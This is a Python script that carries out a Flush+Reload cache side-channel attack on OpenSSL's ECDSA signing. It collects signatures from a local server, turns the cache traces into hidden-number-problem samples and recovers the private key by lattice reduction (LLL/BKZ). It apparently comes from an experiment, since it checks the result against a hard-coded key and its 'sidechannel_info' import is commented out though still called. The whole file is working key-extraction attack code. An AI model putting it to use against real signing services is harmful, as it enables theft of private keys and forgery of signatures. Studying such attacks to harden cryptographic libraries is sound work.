#!/home/tpb/anaconda2/envs/env/bin/python
import subprocess
import socket
import base64
import time
import operator
import os
import sys
import math
#import sidechannel_info
from enum import Enum
from cryptography import x509
import cryptography.hazmat.backends.openssl.backend as OSSL
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
from fpylll import IntegerMatrix, GSO, BKZ, LLL

PORT = 12351

SC_Included = 0 # Side channel indicates m + (rx % q) <  q
SC_Excluded = 1 # Side channel indicates m + (rx % q) >= q

order = int("ffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551",16)

f = open("public.pem")
pub_bytes = f.read()
cert = x509.load_pem_x509_certificate(pub_bytes, OSSL)
pub = cert.public_key()
f.close()

order = int("ffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551",16)
cpa = True
d = int(sys.argv[1])
b = int(sys.argv[2])
count_true = 0
count = 0
print "sample_count = " + str(d)
print "KnownBits = " + str(b)
udata = None
nsigs = 0
def print_flag(flag1):
    if(flag1==0):
        print "SC_Included",
    else:
        print "SC_Excluded",
def sidechannel_cache(userdata=None):
    cmd = [
        "./flushreload",
        "/usr/lib/x86_64-linux-gnu/libcrypto.so.1.1",
        "70",
        "6000",
        "f4e70",
        "f4582",
        "a4b9f",
        "a4b42",
        "ed180",
    ]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    meas_proc = p

    if userdata is None:
        userdata = os.urandom(32)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost',PORT))
    s.sendall(userdata)

    data = s.recv(512)
    s.close()

    sig = base64.b64decode(data)

    meas_proc.wait()
    meas_out, _ = meas_proc.communicate()
    out = meas_out.rstrip()

    entries = out.split("\n")
    out = [[1 if c == '1' else 0 for c in row] for row in entries]

    while len(out) > 0 and len(out[-1]) > 0 and out[-1][-1] == 0:
        out = out[:-1]

    if len(out) < 5 or out[-1][-1] != 1:
        return SC_Excluded, userdata, sig

    out_t = zip(*out[-5:])
    ored = [reduce(operator.__or__, t, 0) for t in out_t]
    # print ored
    if ored == [0, 1, 0, 0, 1]:
        return SC_Included, userdata, sig
    else:
        return SC_Excluded, userdata, sig

def compute_m_from_userdata(udata):
    if udata is None:
        return None
    
    h = hashes.Hash(hashes.SHA256(), backend=OSSL)
    h.update(udata)
    return h.finalize()

def compute_approximation_from_sig(m, r, s, q,flag):

    if flag == SC_Included:
        t = r
        u = (q - m) / 2
        v = (q - m) / 2
    else:
        t = q - r
        u = m / 2
        v = m / 2

    return t, u, v

def get_hnp_approximation():
    global nsigs,count_true,count
    ud = os.urandom(8)
    res, ud, sig  = sidechannel_cache(userdata=ud)
    nsigs += 1

    m_b = compute_m_from_userdata(ud)
    m = int(m_b.encode("hex"),16)
    r, s = decode_dss_signature(sig)
    q = order
    m = m % q
    flag = sidechannel_info.give_range(m,r,q)
    if res==0:
        t,u,v = compute_approximation_from_sig(m, r, s, q,res)
        no_msb = math.log(q/v)/math.log(2)
        if no_msb > b:
            # print_flag(flag)
            # print_flag(res)
            # count+=1
            # count_true+=int(flag==res)
            # print count,count_true,flag==res
            print flag==res
            return t,u,v
        else:
            return None
    else:
        return None

def solve_hnp (samples):
    d = len(samples)
    q = order

    B = IntegerMatrix(d + 2, d + 2)
    for i in range(d):
        t, u, v = samples[i]
        scale = q / v
        B[i,i] = q * scale
        B[d,i] = t * scale
        B[d+1,i] = u * scale
    B[d,d] = 1
    B[d+1,d+1] = q

    M = GSO.Mat(B)
    L_red = LLL.Reduction(M)
    bkzparam = BKZ.Param(block_size=20)
    B_red = BKZ.Reduction(M, L_red, bkzparam)
    B_red()

    if B[1,d+1] > 0:
        x = -1 * B[1,d]
    else:
        x = B[1,d]
    if x < 0:
        x += q

    private_value = 834818473318008049647448379209460658614088501345180055220225408308906924726
    print x==private_value
    priv = ec.derive_private_key(x, pub.curve, OSSL)
    original = ec.derive_private_key(private_value, pub.curve, OSSL)
    return priv,original

def run ():

    samples = []

    cnt = 10000000

    print "Beginning sample collection."
    while len(samples) < d and cnt > 0:
        cnt -= 1
        hnp_approx = get_hnp_approximation()
        if hnp_approx is not None:
            samples.append(hnp_approx)
            print >> sys.stderr, "Collected sample", len(samples)

    print "Required %d signatures." % nsigs
    print "Collection complete. Solving..."
    priv,orig = solve_hnp(samples)
    if priv is not None:
        pem = priv.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        original = orig.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        return pem,original


def main():
    priv_pem,original = run()
    if priv_pem is not None:
        print "Recovered Key------"
        print priv_pem
        print "Original Key------"
        print original
    else:
        print "Solving failed."

if __name__ == "__main__":
    main()
